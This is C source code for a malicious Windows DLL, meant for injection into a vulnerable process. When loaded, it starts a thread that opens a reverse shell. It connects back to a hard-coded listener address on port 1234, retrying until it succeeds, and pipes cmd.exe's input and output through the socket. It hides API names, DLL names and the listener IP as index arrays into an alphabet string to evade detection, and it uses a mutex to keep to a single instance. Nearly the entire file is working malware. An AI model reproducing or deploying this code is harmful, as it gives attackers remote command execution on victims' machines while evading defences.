#include <windows.h>
#include "native.h"
#include <stdlib.h>

#define MAX 600
NTSTATUS STATUS;

/*
p.s. this DLL needs a malicious code to inject it properly
what this dll should do?
	-when it's called by the vulnerable process it should decrypt shellcode in memory and execute it accordingly
	
	-OR you might use the reverse shell code to connect back to the attacker.
*/


HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	printf("[+] Got Handle to module!\n");
	printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}

HANDLE mutex_stuff(){
	printf("[+] creating mutex\n");
	
	SECURITY_ATTRIBUTES sec_attr = {(DWORD) sizeof(SECURITY_ATTRIBUTES), NULL , TRUE};
	
	HANDLE my_mutex = CreateMutexA(&sec_attr,TRUE,"dll_mutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
    // Malware instance already running
	printf("[x] malware is already running \n");
    exit(1);  // Exit or perform cleanup
	}
	printf("[+] mutex created successfully\n");
	return my_mutex;
}

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

DWORD WINAPI MAIN_THREAD( LPVOID lpParam ){
	MAIN_MEAT();
	return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
			MessageBoxA(NULL, "Malicious DLL Attached and Executed!!!!!!!", "WARNING", MB_ICONEXCLAMATION);
			HMODULE hNTDLL = Get_Module(L"NTDLL");
			HANDLE hThread;
			HANDLE hProcess = NtCurrentProcess();
			ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
			//CLIENT_ID CID;
			NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx"); 
			STATUS = NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr,hProcess,MAIN_THREAD,NULL,FALSE,0,0,0,NULL);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
			//MessageBoxA(NULL, "Thread Created!", "WARNING", MB_ICONEXCLAMATION);
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            //MessageBoxA(NULL, "Thread Terminated!", "WARNING", MB_ICONEXCLAMATION);
			break;

        case DLL_PROCESS_DETACH:
    
			//MessageBoxA(NULL, "Process Terminated!", "WARNING", MB_ICONEXCLAMATION);
			break; // do not do cleanup if process termination scenario
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}



int MAIN_MEAT(){
	HANDLE hMutex=mutex_stuff();
	WSADATA wsaData;
	SOCKET client_socket;
	struct sockaddr_in server_addr;
	int _p__0rt=1234; //PUT SERVER PORT HERE
	char recv_buffer[MAX];
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
	int connect;
	
	int wsa_startup_offset[] = {48,44,26,44,19,0,17,19,20,15};
	int wsa_socket_offset[] = {48,44,26,44,14,2,10,4,19,26};
	int wsa_connect_offset[] = {48,44,26,28,14,13,13,4,2,19} ;
	int h_tons_offset[] = {7,19,14,13,18};
	int inet_addr_offset[] = {8,13,4,19,63,0,3,3,17};
	int wsa_cleanup_offset[] = {48,44,26,28,11,4,0,13,20,15};
	int wait_for_single_object_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
	int create_process_A_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26,};
	int exe_c_C_M_d_offset[] = {2,12,3,62,4,23,4};	//cmd.exe
	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,53,62,57,52}; 	//192.168.1.50
	int dll_ws2__32_offset[] = {22,18,54,63,55,54,62,3,11,11};
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int close_sock_offset[] = {2,11,14,18,4,18,14,2,10,4,19};
	int recv_offset[] = {17,4,2,21};
	
	
	// --- START LOAD WS2_32 DLL --- //
	HMODULE hDLL_ws2__32 = LoadLibraryA(GetOriginal(dll_ws2__32_offset,ALL_ALPHANUM,sizeof(dll_ws2__32_offset)));
	if (hDLL_ws2__32 == NULL){
		//printf("[x] COULD NOT LOAD ws2_32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD WS2_32 DLL --- //
	
	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = LoadLibraryA(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START GET FUNCTIONS --- //
	FARPROC wsa_startup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_startup_offset,ALL_ALPHANUM,sizeof(wsa_startup_offset)));
	FARPROC wsa_socket_func =  GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_socket_offset,ALL_ALPHANUM,sizeof(wsa_socket_offset)));
	FARPROC h_tons_func = GetProcAddress(hDLL_ws2__32, GetOriginal(h_tons_offset,ALL_ALPHANUM,sizeof(h_tons_offset)));;
	FARPROC inet_addr_func = GetProcAddress(hDLL_ws2__32, GetOriginal(inet_addr_offset,ALL_ALPHANUM,sizeof(inet_addr_offset)));;
	FARPROC wsa_connect_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_connect_offset,ALL_ALPHANUM,sizeof(wsa_connect_offset)));
	FARPROC wsa_cleanup_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_cleanup_offset,ALL_ALPHANUM,sizeof(wsa_cleanup_offset)));
	FARPROC close_sock_func = GetProcAddress(hDLL_ws2__32,GetOriginal(close_sock_offset,ALL_ALPHANUM,sizeof(close_sock_offset)));
	FARPROC recv_func = GetProcAddress(hDLL_ws2__32,GetOriginal(recv_offset,ALL_ALPHANUM,sizeof(recv_offset)));
	//printf("[+] GOT ALL FUNCTION ADDRESSES FROM THE ws2_32.dll\n");
	
	FARPROC create_process_A_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_process_A_offset,ALL_ALPHANUM,sizeof(create_process_A_offset)));
	FARPROC wait_for_single_object_func = GetProcAddress(hDLL_k_er_32,GetOriginal(wait_for_single_object_offset,ALL_ALPHANUM,sizeof(wait_for_single_object_offset)));
	// --- END GET FUNCTOINS --- //
	
	//start winsock 2.2
	//printf("[+] initializing winsock 2.2\n");
	if ( wsa_startup_func(MAKEWORD(2,2),&wsaData) != 0 ){
		//printf("[x] winsock failed, err code: %d\n",WSAGetLastError());
		exit(1);
	};

	//create socket
	//printf("[+] creating socket\n");
	client_socket=wsa_socket_func(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if (client_socket == INVALID_SOCKET){
		//printf("[x] socket creation failed, err code: %d\n",WSAGetLastError());
		wsa_cleanup_func();
		exit(1);
	
	}
	
	//assigning server values
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=h_tons_func(_p__0rt);
	server_addr.sin_addr.s_addr=inet_addr_func(GetOriginal(listener_addr_offset,ALL_ALPHANUM,sizeof(listener_addr_offset)));
	if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
		//printf("[x] invalid address\n[x]exiting\n");
		close_sock_func(client_socket);
		wsa_cleanup_func();
		exit(1);
		
	};

	//connect to server
	//printf("[+] connecting to server\n");
	
	do{
		connect = wsa_connect_func(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
		
	} while (connect != 0);
	
	/*
	if (connect != 0){
		//printf("[x] can't connect to server\n");
		close_sock_func(client_socket);
		wsa_cleanup_func();
		exit(1);
	}
	*/
	//recieve data
	recv_func(client_socket,recv_buffer,sizeof(recv_buffer),0);	



	// CREATING PROCESS //
	//declare process struct and info 
	STARTUPINFOA proc;
	PROCESS_INFORMATION proc_info;
	memset(&proc,0,sizeof(proc));
	proc.cb=sizeof(proc);
	proc.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	proc.hStdInput=(HANDLE) client_socket;
	proc.hStdOutput=(HANDLE) client_socket;
	proc.hStdError=(HANDLE) client_socket; //pipe stderr stdin stdout to socket

	//create process
	create_process_A_func(NULL,GetOriginal(exe_c_C_M_d_offset,ALL_ALPHANUM,sizeof(exe_c_C_M_d_offset)),NULL,NULL,TRUE,0,NULL,NULL,&proc,&proc_info); //spawm cmd	
	
	//wait for process to finish
	
	wait_for_single_object_func(proc_info.hProcess,INFINITE);
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	

	// PROCESS END //
	
 
	//CLEANUP	
	memset(recv_buffer,0,sizeof(recv_buffer));
	close_sock_func(client_socket);
	wsa_cleanup_func();
	return 0;
}

